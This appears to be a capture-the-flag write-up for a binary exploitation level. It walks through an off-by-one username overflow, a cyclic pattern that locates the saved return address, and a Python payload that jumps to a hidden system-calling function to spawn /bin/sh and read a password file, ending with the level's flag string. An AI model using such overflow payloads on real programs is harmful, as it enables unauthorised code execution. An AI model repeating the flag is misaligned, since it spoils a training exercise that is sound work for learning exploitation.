We have a program that asks for a username and a message.

We can see that there is a function called `secret_backdoor`
A quick disas:

```
gdb ./level07
disas secret_backdoor
```

shows there is a call to system

```
0x00000000000008b9 <+45>:	callq  0x740 <system@plt>
```

When looking at the source code we can see we have a small window for buffer overflow in the function `set_username`
The same buffer is passed as parameters to both function set_username and set_msg. Both functions use it:
set_username writes up to 41 bytes (from p + 140 to p + 180)
set_msg reads a large fgets of 1024 and then copies with strncpy up to p + 180 bytes.

We can then override the value stored at p + 180 with the 41st byte of our username.

```
(python -c 'print "X" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9" + "\n"' ; cat) | ./level09
```

We obtain a segfault:
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
i f
Stack level 0, frame at 0x7fffffffe5c8:
rip = 0x555555554931 in handle_msg; saved rip 0x4138674137674136
called by frame at 0x7fffffffe5d8
Arglist at 0x6741356741346741, args:
Locals at 0x6741356741346741, Previous frame's sp is 0x7fffffffe5d0
Saved registers:
rip at 0x7fffffffe5c8

saved rip offset is 200

lets redirect to => 0x55555555488c (secret_backdoor) and then pass it the parameter we want : "/bin/sh" (through its fgets)

```
(python -c 'print "X" * 40 + "\xff" + "\n" + "X" * 200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n"' ; cat) | ./level09
```

cat /home/users/end/.pass

flag

```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
